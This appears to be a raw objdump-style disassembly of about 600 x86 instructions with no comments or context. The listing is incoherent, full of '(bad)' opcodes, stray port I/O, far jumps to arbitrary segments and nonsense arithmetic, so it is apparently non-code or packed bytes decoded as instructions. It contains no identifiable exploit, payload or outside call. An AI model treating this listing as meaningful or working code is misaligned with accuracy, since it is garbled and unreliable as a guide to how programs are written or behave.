  403ee2:	fild   QWORD PTR [esi-0x54]
  403ee5:	sub    eax,DWORD PTR [ecx-0x1bd8fb20]
  403eeb:	adc    eax,0x71100979
  403ef0:	or     edi,ebp
  403ef2:	arpl   WORD PTR [edx+eax*1-0x6b],cx
  403ef6:	out    0xf3,al
  403ef8:	das    
  403ef9:	fbld   TBYTE PTR [eax]
  403efb:	cmc    
  403efc:	das    
  403efd:	xchg   ebp,eax
  403efe:	push   esi
  403eff:	addr16 push 0x2248da04
  403f05:	xor    DWORD PTR [ecx-0x45],0xdf57335
  403f0c:	sub    DWORD PTR [eax-0x6d44e407],eax
  403f12:	mov    BYTE PTR [esi-0x5e],ah
  403f15:	pop    ds
  403f16:	push   cs
  403f17:	outs   dx,BYTE PTR ds:[esi]
  403f18:	(bad)  
  403f19:	jecxz  0x403f74
  403f1b:	jno    0x403f0e
  403f1d:	dec    esp
  403f1e:	push   ecx
  403f1f:	pop    ebx
  403f20:	adc    DWORD PTR [ecx],ebx
  403f22:	pushf  
  403f23:	sbb    al,0x55
  403f25:	push   esp
  403f26:	pop    ebx
  403f27:	push   ecx
  403f28:	lea    eax,[ecx]
  403f2a:	mov    eax,0x9d3db67f
  403f2f:	les    edx,FWORD PTR [ebp+0x19]
  403f32:	jnp    0x403eb5
  403f34:	and    edx,ebp
  403f36:	inc    edi
  403f37:	jge    0x403f86
  403f39:	dec    esp
  403f3a:	mov    esi,0x2d8e99f4
  403f3f:	or     al,0x9c
  403f41:	pop    eax
  403f42:	mov    ebp,0xf63fb4c1
  403f47:	fisttp QWORD PTR [eax-0x1a]
  403f4a:	lds    esp,FWORD PTR [esp+ebp*2+0x44]
  403f4e:	je     0x403f75
  403f50:	add    esp,esp
  403f52:	(bad)
  403f55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f56:	xchg   ecx,eax
  403f57:	inc    eax
  403f58:	mov    al,0x70
  403f5a:	into   
  403f5b:	adc    cl,BYTE PTR [edi+0x57]
  403f5e:	scas   eax,DWORD PTR es:[edi]
  403f5f:	xor    eax,0xa7a22552
  403f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f65:	or     dh,cl
  403f67:	ror    DWORD PTR [esi+0x70e5e0fc],cl
  403f6d:	mov    ebx,0xc0adb6e1
  403f72:	mov    dl,0xb2
  403f74:	aas    
  403f75:	pusha  
  403f76:	(bad)  
  403f77:	scas   al,BYTE PTR es:[edi]
  403f78:	cmp    eax,0x4c1b6e59
  403f7d:	stos   DWORD PTR es:[edi],eax
  403f7e:	xor    BYTE PTR [edx],0x2f
  403f81:	pop    edi
  403f82:	pop    ss
  403f83:	mov    ebx,0xf85a254d
  403f88:	(bad)  
  403f89:	jmp    0xeadd:0x260e8835
  403f90:	add    BYTE PTR [eax+0x77],cl
  403f93:	xchg   esi,eax
  403f94:	imul   ebx,ecx,0xffffff80
  403f97:	add    DWORD PTR [esp+edx*8+0x17c4f238],0xffffffd0
  403f9f:	je     0x403f83
  403fa1:	xchg   BYTE PTR [edx+0x74],bl
  403fa4:	cmp    eax,0xc69118a1
  403fa9:	jle    0x40401f
  403fab:	test   eax,0x364bbccc
  403fb0:	daa    
  403fb1:	jp     0x403fa0
  403fb3:	in     al,0x4d
  403fb5:	lahf   
  403fb6:	push   edi
  403fb7:	cld    
  403fb8:	xchg   edx,eax
  403fb9:	sub    eax,0xb46db87a
  403fbe:	in     eax,0x64
  403fc0:	fucom  st(3)
  403fc2:	cmpxchg DWORD PTR [ecx],ebx
  403fc5:	scas   al,BYTE PTR es:[edi]
  403fc6:	xor    BYTE PTR [ebp-0x45],cl
  403fc9:	subps  xmm5,XMMWORD PTR [ebp+0x29f83bc8]
  403fd0:	jno    0x404039
  403fd2:	dec    ecx
  403fd3:	test   eax,0x9dc254e3
  403fd8:	ret    
  403fd9:	pop    esp
  403fda:	cmp    ah,dl
  403fdc:	add    edi,DWORD PTR [edi-0x6728d167]
  403fe2:	push   ebx
  403fe3:	sub    ch,bh
  403fe5:	sbb    ecx,0x7c
  403fe8:	push   0x2538d86
  403fed:	cs cwde 
  403fef:	push   cs
  403ff0:	je     0x403f95
  403ff2:	mov    ds:0xe0e33b42,al
  403ff7:	out    0x4,eax
  403ff9:	xchg   edi,eax
  403ffa:	or     edi,DWORD PTR [edx+0x3c96fa6f]
  404000:	add    BYTE PTR [edx+edx*1],bh
  404003:	mov    dh,0x21
  404005:	out    dx,eax
  404006:	mov    ch,0xf
  404008:	push   edx
  404009:	and    DWORD PTR [ecx+eiz*8-0x260340bb],ebp
  404010:	xchg   ecx,eax
  404011:	mov    BYTE PTR [ebx+ebp*2+0x6e],ch
  404015:	loope  0x403ff3
  404017:	cli    
  404018:	outs   dx,BYTE PTR ds:[esi]
  404019:	push   esi
  40401a:	scas   al,BYTE PTR es:[edi]
  40401b:	stos   DWORD PTR es:[edi],eax
  40401c:	mov    eax,ds:0xc5d13731
  404021:	imul   esp,DWORD PTR [ecx-0x35637772],0x6
  404028:	loope  0x40409b
  40402a:	mov    BYTE PTR [eax+0x5e1c87ec],ch
  404030:	sub    BYTE PTR ds:0xc786d046,dl
  404036:	add    BYTE PTR [esp+ebx*4-0x71],cl
  40403a:	jl     0x404092
  40403c:	fcmovne st,st(4)
  40403e:	loopne 0x4040af
  404040:	mov    al,ds:0xba403e4b
  404045:	dec    ebp
  404046:	mov    eax,ds:0xcd08bdf9
  40404b:	sbb    esi,ebp
  40404d:	xor    DWORD PTR [ebx+ecx*2],esi
  404050:	sub    dl,cl
  404052:	les    edi,FWORD PTR [edx-0x46]
  404055:	cmp    esi,DWORD PTR [ebx+0x110642db]
  40405b:	mov    ch,bl
  40405d:	lahf   
  40405e:	cdq    
  40405f:	add    ch,BYTE PTR [eax+0x64]
  404062:	or     ebx,DWORD PTR [edx]
  404064:	adc    al,0xcb
  404066:	std    
  404067:	imul   DWORD PTR [ecx]
  404069:	dec    ebx
  40406a:	cmp    edi,DWORD PTR ds:0x637c5f88
  404070:	sbb    esi,DWORD PTR [eax]
  404072:	dec    esp
  404073:	mov    edi,0x6e88bec0
  404078:	(bad)  
  404079:	fwait
  40407a:	sbb    ebx,DWORD PTR [edi+0xfcd2d43]
  404080:	pop    ebp
  404081:	outs   dx,BYTE PTR ds:[esi]
  404082:	jp     0x404098
  404084:	and    bh,al
  404086:	rol    DWORD PTR [edi-0x58],0x60
  40408a:	dec    eax
  40408b:	fsub   QWORD PTR ds:[edx]
  40408e:	push   eax
  40408f:	loop   0x404057
  404091:	test   BYTE PTR [ebx],dl
  404093:	or     eax,0x6b0ac82d
  404098:	push   ds
  404099:	cli    
  40409a:	pop    ecx
  40409b:	adc    DWORD PTR [edi+0x1f54da74],0xffffffaf
  4040a2:	ss daa 
  4040a4:	and    BYTE PTR [eax],ch
  4040a6:	or     esi,DWORD PTR [edx-0x76]
  4040a9:	fcom   st(7)
  4040ab:	push   eax
  4040ac:	stos   DWORD PTR es:[edi],eax
  4040ad:	sbb    dh,BYTE PTR [eax]
  4040af:	sub    al,0xd4
  4040b1:	jbe    0x404051
  4040b3:	xchg   ebx,eax
  4040b4:	repnz in eax,0x42
  4040b7:	fwait
  4040b8:	leave  
  4040b9:	aas    
  4040ba:	push   0xffffff8d
  4040bc:	aaa    
  4040bd:	arpl   WORD PTR [esi],ax
  4040bf:	or     dh,BYTE PTR [eax+0x28c2f234]
  4040c5:	cmp    al,0x67
  4040c7:	dec    esp
  4040c8:	inc    esp
  4040c9:	pop    es
  4040ca:	movaps xmm7,XMMWORD PTR [eax+0x3d]
  4040ce:	jbe    0x404061
  4040d0:	sahf   
  4040d1:	push   ecx
  4040d2:	and    DWORD PTR [edx],edi
  4040d4:	je     0x4040fe
  4040d6:	enter  0xf613,0x99
  4040da:	in     eax,0x16
  4040dc:	inc    esp
  4040dd:	std    
  4040de:	push   ds
  4040df:	sti    
  4040e0:	add    edi,DWORD PTR [edi+ebx*4]
  4040e3:	pop    ecx
  4040e4:	inc    ebx
  4040e5:	lods   eax,DWORD PTR ds:[esi]
  4040e6:	cmp    eax,ebx
  4040e8:	mov    edi,0x3f9b7e17
  4040ed:	mov    ds:0x2c8d224c,eax
  4040f2:	sbb    cl,bl
  4040f4:	lock sub eax,0x888cab9a
  4040fa:	pop    edi
  4040fb:	sub    al,0xf0
  4040fd:	sbb    al,0x1f
  4040ff:	sahf   
  404100:	popa   
  404101:	mul    BYTE PTR [edi+0x20]
  404104:	or     esi,eax
  404106:	inc    ecx
  404107:	xor    eax,DWORD PTR [esi+0x1856f4da]
  40410d:	cwde   
  40410e:	cld    
  40410f:	inc    ecx
  404110:	gs aad 0x25
  404113:	adc    al,0xed
  404115:	retf   
  404116:	inc    ebp
  404117:	loop   0x404148
  404119:	fcomp  st(3)
  40411b:	sqrtps xmm1,XMMWORD PTR [eax-0x69]
  40411f:	add    dl,BYTE PTR [ebp*4+0x5ac8c260]
  404126:	push   ebx
  404127:	sbb    edx,ecx
  404129:	mov    ds:0x54900de1,al
  40412e:	mov    eax,ds:0xcf558181
  404133:	add    al,0x68
  404135:	inc    ecx
  404136:	(bad)  
  404137:	rcr    BYTE PTR [ebp-0x1],0x90
  40413b:	mov    ch,0x2f
  40413d:	add    al,0x36
  40413f:	js     0x40411e
  404141:	cmp    dl,BYTE PTR [eax]
  404143:	dec    edi
  404144:	jecxz  0x40411f
  404146:	addr16 popf 
  404148:	das    
  404149:	ja     0x4040d4
  40414b:	nop
  40414c:	nop
  40414d:	loop   0x4041ae
  40414f:	adc    DWORD PTR [ecx-0x49da9189],eax
  404155:	gs int 0x38
  404158:	or     al,0xe5
  40415a:	test   DWORD PTR [ecx],edx
  40415c:	cmp    eax,0xbebfe914
  404161:	and    DWORD PTR [edx],esi
  404163:	addr16 jb 0x404109
  404166:	cld    
  404167:	enter  0xec3,0xfa
  40416b:	pop    es
  40416c:	repz xchg esi,eax
  40416e:	call   0x5ac4b1e9
  404173:	call   0x3b884a1e
  404178:	test   ebx,0xf802fd3
  40417e:	imul   esp,ebp,0x19
  404181:	mov    dl,0x9a
  404183:	pusha  
  404184:	scas   al,BYTE PTR es:[edi]
  404185:	cmp    BYTE PTR [ecx],cl
  404187:	cmp    dl,ah
  404189:	iret   
  40418a:	and    BYTE PTR [eax],bl
  40418c:	or     dh,BYTE PTR [esi+0x9b4e9df]
  404192:	xor    bh,BYTE PTR [edx]
  404194:	cmp    eax,0x697f9bbb
  404199:	push   ebp
  40419a:	pop    ecx
  40419b:	mov    eax,ds:0x2e12d6ae
  4041a0:	jae    0x404189
  4041a2:	in     eax,dx
  4041a3:	add    ch,dh
  4041a5:	xor    edi,ecx
  4041a7:	jb     0x404226
  4041a9:	fs (bad) 
  4041ac:	push   edi
  4041ad:	xchg   edx,eax
  4041ae:	xchg   edx,eax
  4041af:	cmp    ecx,eax
  4041b1:	jg     0x40421f
  4041b3:	push   esi
  4041b4:	stc    
  4041b5:	call   0xc50e:0x7f2a160a
  4041bc:	cmovbe ebx,DWORD PTR [esi]
  4041bf:	pop    edx
  4041c0:	jne    0x4041dd
  4041c2:	mov    ch,BYTE PTR [eax+ebx*8-0x41]
  4041c6:	sbb    ebp,DWORD PTR [ebx]
  4041c8:	and    DWORD PTR [eax-0x6b],esi
  4041cb:	aaa    
  4041cc:	sbb    al,0x7f
  4041ce:	pop    ss
  4041cf:	mov    bh,al
  4041d1:	mov    WORD PTR [eax-0x44],?
  4041d4:	addr16 mov al,al
  4041d7:	mov    ds:0x5d87ae5c,eax
  4041dc:	xchg   ebx,eax
  4041dd:	emms   
  4041df:	loopne 0x4041c3
  4041e1:	sub    al,0x9b
  4041e3:	jns    0x404188
  4041e5:	jo     0x4041f9
  4041e7:	mov    ebx,0xda03b993
  4041ec:	xor    bh,dh
  4041ee:	pushf  
  4041ef:	add    dl,BYTE PTR ds:0x93fd301c
  4041f5:	xchg   BYTE PTR [edi],cl
  4041f7:	sub    dh,al
  4041f9:	call   0x36b4:0x3a9a0ea5
  404200:	and    ecx,DWORD PTR [edi-0x18]
  404203:	push   esp
  404204:	jmp    0xe3ea:0x9774ab31
  40420b:	jmp    0x3c25ee7a
  404210:	or     al,BYTE PTR [edx]
  404212:	dec    esi
  404213:	pushf  
  404214:	sub    al,0xe9
  404216:	mul    BYTE PTR [edx]
  404218:	into   
  404219:	xchg   cl,dh
  40421b:	enter  0x162e,0x3
  40421f:	dec    esi
  404220:	dec    esi
  404221:	and    BYTE PTR [ebx+0x4ed3e3f0],dh
  404227:	lock std 
  404229:	push   ebx
  40422a:	pop    ebp
  40422b:	arpl   di,bp
  40422d:	aas    
  40422e:	sbb    ah,al
  404230:	sub    dh,BYTE PTR [ecx+0x23949bc8]
  404236:	cdq    
  404237:	mov    cl,0xa4
  404239:	xor    al,0x46
  40423b:	sub    bl,BYTE PTR [esi+0x250dc85b]
  404241:	adc    BYTE PTR [ecx+0x7b],dh
  404244:	(bad)  
  404245:	fidivr WORD PTR [edi-0x3a]
  404248:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404249:	xchg   esi,eax
  40424a:	sbb    al,0xa8
  40424c:	mov    edx,0x3ce90578
  404251:	sub    BYTE PTR [eax-0x7ca08d5d],0x64
  404258:	mov    WORD PTR [ecx-0x1d39846e],ds
  40425e:	cdq    
  40425f:	ror    BYTE PTR [ecx+0x27],0x6a
  404263:	jmp    0x8d86:0x323ba24b
  40426a:	js     0x4042b3
  40426c:	jne    0x40427e
  40426e:	mov    edx,0x3aa17844
  404273:	lds    esi,FWORD PTR [edx-0x2db92cd2]
  404279:	addr16 test al,0xef
  40427c:	into   
  40427d:	dec    ecx
  40427e:	pop    es
  40427f:	mov    ds,WORD PTR [ecx-0x231df3cf]
  404285:	(bad)  
  404286:	sbb    al,0x56
  404288:	aad    0x8c
  40428a:	and    BYTE PTR [ebp-0x56],cl
  40428d:	xchg   BYTE PTR [ebp-0x2d],bh
  404290:	xchg   ebx,eax
  404291:	inc    esp
  404292:	loop   0x404276
  404294:	add    DWORD PTR [edx+0x21fdf362],edx
  40429a:	xor    dh,BYTE PTR [edi-0x723e5d38]
  4042a0:	loopne 0x4042f2
  4042a2:	cmp    edx,DWORD PTR [edi-0xb0f51f8]
  4042a8:	imul   esp,DWORD PTR [ecx-0x77],0x1f615e61
  4042af:	ss dec ebp
  4042b1:	and    esp,DWORD PTR [ebx]
  4042b3:	push   esp
  4042b4:	sbb    eax,DWORD PTR fs:[esp+esi*8+0x9]
  4042b9:	fst    DWORD PTR [ebx-0x22207486]
  4042bf:	sbb    BYTE PTR [edi-0x4e],0xbf
  4042c3:	adc    BYTE PTR [ecx],dl
  4042c5:	in     al,dx
  4042c6:	push   0x3c
  4042c8:	nop
  4042c9:	xor    bh,BYTE PTR [eax+0x49]
  4042cc:	jmp    0xe391:0x3d51fa9e
  4042d3:	shl    BYTE PTR [eax+eiz*8+0x70],cl
  4042d7:	cmc    
  4042d8:	xor    edx,edi
  4042da:	sti    
  4042db:	fcmovnu st,st(2)
  4042dd:	jb     0x4042ee
  4042df:	sub    bl,BYTE PTR [edi+0xb5b23a7]
  4042e5:	aad    0xc1
  4042e7:	ror    DWORD PTR [eax+eax*4-0x51],cl
  4042eb:	aaa    
  4042ec:	cmp    eax,DWORD PTR [eax]
  4042ee:	jp     0x404358
  4042f0:	cmp    eax,DWORD PTR [ecx+eiz*8-0x4]
  4042f4:	pop    ebx
  4042f5:	outs   dx,BYTE PTR ds:[esi]
  4042f6:	push   edx
  4042f7:	(bad)  
  4042f8:	or     BYTE PTR [ebp+0x38e0452c],dh
  4042fe:	add    al,0x3d
  404300:	push   edx
  404301:	push   eax
  404302:	push   ss
  404303:	inc    edi
  404304:	mov    ds:0x5aa25fd9,al
  404309:	not    DWORD PTR [esi+eax*8-0x1e]
  40430d:	mov    eax,0xb4a860e8
  404312:	ins    DWORD PTR es:[edi],dx
  404313:	adc    DWORD PTR [esi],esi
  404315:	mov    al,0x5a
  404317:	jmp    0x404347
  404319:	cmp    ecx,DWORD PTR [edx-0x40c6ac9a]
  40431f:	mov    ecx,gs
  404321:	ja     0x40438c
  404323:	out    dx,eax
  404324:	in     eax,dx
  404325:	and    ecx,DWORD PTR [esi]
  404327:	jb     0x40433a
  404329:	push   ds
  40432a:	push   ebp
  40432b:	push   ebp
  40432c:	pop    edi
  40432d:	mov    esi,0x4206f167
  404332:	inc    ecx
  404333:	jb     0x40437d
  404335:	cli    
  404336:	mov    eax,0x15a9f3f4
  40433b:	push   esi
  40433c:	pop    ecx
  40433d:	jo     0x4042de
  40433f:	out    dx,al
  404340:	pop    eax
  404341:	aam    0x2a
  404343:	jle    0x404354
  404345:	daa    
  404346:	and    BYTE PTR [eax],0x6e
  404349:	popa   
  40434a:	lock call 0xaedf:0x10738e2c
  404352:	push   eax
  404353:	int    0x1
  404355:	cmp    BYTE PTR [esi+0x53],ch
  404358:	clc    
  404359:	inc    esi
  40435a:	pop    esi
  40435b:	mov    eax,ds:0xd0baf9d3
  404360:	cmp    al,ch
  404362:	rcl    esp,cl
  404364:	ins    BYTE PTR es:[edi],dx
  404365:	xchg   ecx,eax
  404366:	dec    eax
  404367:	cmp    cl,BYTE PTR [ecx*4+0x5faccfa8]
  40436e:	loope  0x404399
  404370:	lds    eax,FWORD PTR [ecx+ebp*8+0x7d802dc]
  404377:	arpl   WORD PTR [edx-0x136425fb],si
  40437d:	xlat   BYTE PTR ds:[ebx]
  40437e:	ss out dx,al
  404380:	outs   dx,BYTE PTR ds:[esi]
  404381:	and    DWORD PTR [edx-0x41dd916e],0xffffff82
  404388:	lods   eax,DWORD PTR ds:[esi]
  404389:	push   cs
  40438a:	fwait
  40438b:	sub    BYTE PTR [eax-0x11],al
  40438e:	xchg   edx,eax
  40438f:	push   es
  404390:	pop    esp
  404391:	int3   
  404392:	inc    esp
  404393:	fs scas al,BYTE PTR es:[edi]
  404395:	dec    ebx
  404396:	pop    eax
  404397:	ja     0x40432e
  404399:	and    dh,BYTE PTR [ecx-0x5c]
  40439c:	add    eax,0x1d822e71
  4043a1:	mov    eax,edx
  4043a3:	leave  
  4043a4:	pop    esi
  4043a5:	pop    edi
  4043a6:	mov    WORD PTR [esi-0x24],ss
  4043a9:	fld    st(5)
  4043ab:	adc    BYTE PTR [edx+edi*4+0x60ac0d14],ch
  4043b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043b3:	dec    ebx
  4043b4:	adc    eax,0xd4e01f97
  4043b9:	mov    cl,0x60
  4043bb:	aas    
  4043bc:	ror    DWORD PTR [eax-0x304b830b],0xb8
  4043c3:	sub    BYTE PTR [eax+edx*4+0x1478c86c],0x53
  4043cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043cc:	dec    edx
  4043cd:	test   al,0x8a
  4043cf:	and    BYTE PTR [ebp+0x554a1b78],ah
  4043d5:	out    0x50,al
  4043d7:	in     al,dx
  4043d8:	jg     0x4043ee
  4043da:	or     DWORD PTR [ebp-0x5ee17b11],edi
  4043e0:	mov    ds:0x56710898,eax
  4043e5:	inc    edx
  4043e6:	push   edx
  4043e7:	cmp    eax,0xd3d2fdd
  4043ec:	fwait
  4043ed:	pop    ebp
  4043ee:	lds    ecx,FWORD PTR [edx-0x401ca852]
  4043f4:	mov    esp,0x65e46a0f
  4043f9:	jno    0x40446c
  4043fb:	clc    
  4043fc:	pushf  
  4043fd:	xor    al,0x4e
  4043ff:	xor    eax,0x9f8f3d0d
  404404:	sub    eax,ecx
  404406:	out    0xf7,al
  404408:	fs inc esp
  40440a:	sbb    eax,ecx
  40440c:	inc    ebp
  40440d:	mov    bl,0x6a
  40440f:	loope  0x40444c
  404411:	cmp    ebx,DWORD PTR [ebx+0x7a414f1f]
  404417:	ds (bad) 
  40441a:	sar    DWORD PTR [ecx+0x1135748d],cl
  404420:	xchg   ecx,eax
  404421:	je     0x404462
  404423:	repnz or ebx,0x96d71ace
  40442a:	je     0x4043f7
  40442c:	push   0xd6aa4a58
  404431:	add    BYTE PTR [ebx+edi*8+0x37],dl
  404435:	jae    0x40445b
  404437:	xor    eax,0x3ee7acb4
  40443c:	sbb    ebx,DWORD PTR [esi+ebp*2+0x15]
  404440:	mov    ebx,DWORD PTR [ebp+0x2b11b9af]
  404446:	jbe    0x40442a
  404448:	xchg   ecx,eax
  404449:	addr16 (bad) 
  40444b:	std    
  40444c:	jg     0x40448c
  40444e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40444f:	psrld  mm6,QWORD PTR [ebp-0x26]
  404453:	loopne 0x40444b
  404455:	inc    edi
  404456:	pop    es
  404457:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404458:	dec    eax
  404459:	bound  eax,QWORD PTR [ecx-0xf]
  40445c:	xchg   DWORD PTR [ecx-0x16f36891],eax
  404462:	std    
  404463:	pusha  
  404464:	out    dx,eax
  404465:	cmp    BYTE PTR [ebp+0x26],0x6a
  404469:	xlat   BYTE PTR ds:[ebx]
  40446a:	pop    ds
  40446b:	or     DWORD PTR [esi-0xf941ef],0x42
  404472:	and    DWORD PTR [edi-0x3b8a2c62],0x8fe6da99
  40447c:	or     DWORD PTR [ebp-0xe],0xffffff9f
  404480:	jnp    0x404462
  404482:	mov    ebp,ecx
  404484:	jns    0x404407
  404486:	ins    DWORD PTR es:[edi],dx
  404487:	cmc    
  404488:	xlat   BYTE PTR ds:[ebx]
  404489:	inc    edx
  40448a:	(bad)  
  40448c:	shr    cl,0x48
  40448f:	push   ebp
  404490:	inc    eax
  404491:	push   ebp
  404492:	popf   
  404493:	mov    eax,ds:0x2b816cb5
  404498:	bnd jge 0x40443a
  40449b:	je     0x4044de
  40449d:	sbb    bh,BYTE PTR [esi]
  40449f:	pop    esp
  4044a0:	sub    BYTE PTR [eax-0x48],al
  4044a3:	lahf   
  4044a4:	and    edx,DWORD PTR [edx-0x10]
  4044a7:	push   0xffffff84
  4044a9:	nop
  4044aa:	mov    ebp,0x5acaa233
  4044af:	xchg   edi,eax
  4044b0:	mov    al,0xf6
  4044b2:	mov    esp,esi
  4044b4:	leave  
  4044b5:	das    
  4044b6:	repnz and ebp,ebx
  4044b9:	fwait
  4044ba:	fwait
  4044bb:	imul   eax,DWORD PTR [esi-0x2b0e9f3a],0x19
  4044c2:	outs   dx,DWORD PTR ds:[esi]
  4044c3:	jge    0x40451b
  4044c5:	cmp    DWORD PTR [ecx+edi*2+0x2f9266b5],ecx
  4044cc:	(bad)  
  4044cd:	loope  0x40445c
  4044cf:	(bad)  
  4044d0:	pop    ss
  4044d1:	ret    0x6012
  4044d4:	jno    0x404463
  4044d6:	jmp    0x9b8a:0xa0d7c48c
  4044dd:	push   ebx
  4044de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044df:	test   DWORD PTR [ebp+0x31ebfe28],edi
  4044e5:	nop
  4044e6:	cld    
  4044e7:	xor    eax,0xec594ee2
  4044ec:	push   eax
  4044ed:	pusha  
  4044ee:	test   eax,0xe91b7f19
  4044f3:	frstor [ecx-0x2d]
  4044f6:	aam    0xc0
  4044f8:	enter  0xdb92,0x60
  4044fc:	jbe    0x4044f6
  4044fe:	pop    esp
  4044ff:	add    al,0x70
  404501:	dec    ebp
  404503:	adc    ecx,ecx
  404505:	pop    edx
  404506:	scas   al,BYTE PTR es:[edi]
  404507:	cdq    
  404508:	xchg   ebx,eax
  404509:	outs   dx,BYTE PTR ds:[esi]
  40450a:	lahf   
  40450b:	sar    DWORD PTR [ebp-0x6],cl
  40450e:	outs   dx,DWORD PTR ds:[esi]
  40450f:	fucomip st,st(6)
  404511:	and    bh,BYTE PTR [ecx-0x2491ca71]
  404517:	add    BYTE PTR [ecx-0x5c],dl
  40451a:	push   eax
  40451b:	adc    eax,0xf362fcd6
  404520:	xchg   edi,eax
  404521:	pop    esi
  404522:	mov    al,ds:0x487a30d8
  404527:	shl    DWORD PTR [edx+0x41],0xf0
  40452b:	test   bl,bl
  40452d:	pop    es
  40452e:	pop    ss
  40452f:	pop    ds
  404530:	out    dx,eax
  404531:	sbb    BYTE PTR [ecx],bh
  404533:	mov    dh,0xc0
  404535:	pop    edi
  404536:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404537:	or     BYTE PTR [eax+0x41],0x34
  40453b:	retf   0x5d7c
  40453e:	inc    edx
  40453f:	data16 mov ?,WORD PTR [edi]
  404542:	dec    ebp
  404543:	popa   
  404544:	mov    ecx,0xaf5f347a
  404549:	enter  0xe0c5,0x67
  40454d:	xor    eax,DWORD PTR [ecx+edx*8]
  404550:	adc    al,BYTE PTR [ebp-0xf]
  404553:	inc    ebx
  404554:	add    al,0xe3
  404556:	jle    0x404583
  404558:	lds    esp,FWORD PTR [ebp+0x52bbb577]
  40455e:	scas   eax,DWORD PTR es:[edi]
  40455f:	hlt    
  404560:	mov    ah,0xb3
  404562:	and    dh,al
  404564:	ja     0x4045ce
  404566:	xchg   edx,eax
  404567:	dec    esp
  404568:	mov    BYTE PTR [ebp+0x3cfeead9],dl
  40456e:	add    ah,bh
  404570:	jle    0x404519
  404572:	and    ecx,ebx
  404574:	xchg   esp,eax
  404575:	xchg   ebp,eax
  404576:	sub    bh,BYTE PTR [edx+ebx*2-0x4a79f33b]
  40457d:	sbb    ebp,DWORD PTR [ebx+0xbce5877]
  404583:	or     bh,BYTE PTR [ebx+0x7]
  404586:	call   0x91f8:0xf32a136
  40458d:	adc    edx,eax
  40458f:	jle    0x404600
  404591:	cmp    al,0x46
  404593:	add    al,0x31
  404595:	(bad)  
  404596:	mov    ebx,0xa34bfd43
  40459b:	mov    edx,0x730fe545
  4045a0:	jg     0x40454c
  4045a2:	mov    edi,0x119e38cb
  4045a7:	push   ecx
  4045a8:	push   DWORD PTR [edx]
  4045aa:	xchg   esp,eax
  4045ab:	xchg   BYTE PTR [esi],bh
  4045ad:	sbb    BYTE PTR [ecx],dh
  4045af:	cmp    eax,0xbbb28b77
  4045b4:	inc    edx
  4045b5:	cmp    al,0x29
  4045b7:	mov    al,0x1b
  4045b9:	aad    0x8a
  4045bb:	pusha  
  4045bc:	jle    0x4045e8
  4045be:	pop    esp
  4045bf:	scas   eax,DWORD PTR es:[edi]
  4045c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045c1:	pop    esi
  4045c2:	add    eax,0x306c6ce2
  4045c7:	stc    
  4045c8:	les    esp,FWORD PTR [ecx]
  4045ca:	mov    ebx,DWORD PTR [esi+ecx*4+0x60]
  4045ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045cf:	inc    edx
  4045d0:	push   es
  4045d1:	xor    BYTE PTR [esi+0xdb7b28e],ch
  4045d7:	cld    
  4045d8:	jecxz  0x4045c4
  4045da:	retf   0xfb61
  4045dd:	test   al,cl
  4045df:	arpl   cx,sp
  4045e1:	aaa    
  4045e2:	fdivrp st(4),st
  4045e4:	cmp    al,0xe5
  4045e6:	mov    bl,0x2a
  4045e8:	pushf  
  4045e9:	sbb    eax,0xe23ced3c
  4045ee:	call   DWORD PTR [esi-0x7a796098]
  4045f4:	mov    ah,0xb0
  4045f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045f7:	not    DWORD PTR [ebx-0x4f]
  4045fa:	mov    ebx,0xb01c64de
  4045ff:	std    
  404600:	sub    dl,BYTE PTR [ecx-0x42f25722]
  404606:	xor    BYTE PTR [ebx-0x13],0x82
  40460a:	cmp    ebx,DWORD PTR [eax+0xcc38002]
  404610:	je     0x404614
  404612:	push   edx
  404613:	ret    
  404614:	out    dx,eax
  404615:	lds    ebx,FWORD PTR [ecx+0x8]
  404618:	xor    cl,ah
  40461a:	aam    0x51
  40461c:	(bad)  
  40461d:	mov    bh,0x60
  40461f:	lahf   
  404620:	ja     0x4045d1
  404622:	mov    eax,ds:0x8088df9e
  404627:	call   0x6bdb:0xc548050c
  40462e:	jo     0x404627
  404630:	cs and eax,0xb904503b
  404636:	pusha  
  404637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404638:	push   ss
  404639:	or     bh,0x10
  40463c:	xchg   edx,eax
  40463d:	xrelease xchg BYTE PTR [edx+0x3c80092e],cl
  404644:	in     eax,0xa3
  404646:	mov    eax,ds:0x5c1a7768
  40464b:	pop    edi
  40464c:	in     al,0xe
  40464e:	icebp  
  40464f:	int    0xb0
  404651:	int    0x30
  404653:	fistp  WORD PTR [esi]
  404655:	push   fs
  404657:	(bad)  [edi+0x3e]
  40465a:	mov    ah,BYTE PTR [ecx+0x3c984a5e]
  404660:	sahf   
  404661:	cmp    BYTE PTR [ebx+0x74b3eaa4],0xe0
  404668:	lods   eax,DWORD PTR ds:[esi]
  404669:	pop    ds
  40466a:	cmp    ch,BYTE PTR fs:[eax-0x2abc1fc9]
  404671:	mov    ch,BYTE PTR [ebx+0x1e]
  404674:	shr    BYTE PTR [edx+0x4a],cl
  404677:	jbe    0x404657
  404679:	cmp    DWORD PTR ds:0x1aa8f255,eax
  40467f:	bound  ebp,QWORD PTR [edx-0x4b7ff419]
  404685:	jo     0x40464e
  404687:	push   0x4e
  404689:	and    dl,cl
  40468b:	push   edi
  40468c:	call   0x58fe:0xceb89f8c
  404693:	stos   DWORD PTR es:[edi],eax
  404694:	out    dx,al
  404695:	dec    esi
  404696:	or     eax,0x87d6c0e3
  40469b:	adc    al,0x61
  40469d:	imul   edi,edx,0x35
  4046a0:	push   edx
  4046a1:	fwait
  4046a2:	push   0xeae1d50f
  4046a7:	retw   0x378c
  4046ab:	and    BYTE PTR [edi+0x37ed9eab],ah
  4046b1:	pop    ss
  4046b2:	mov    al,0xda
  4046b4:	(bad)  
  4046b5:	neg    DWORD PTR ds:0x6a454b30
  4046bb:	int    0x14
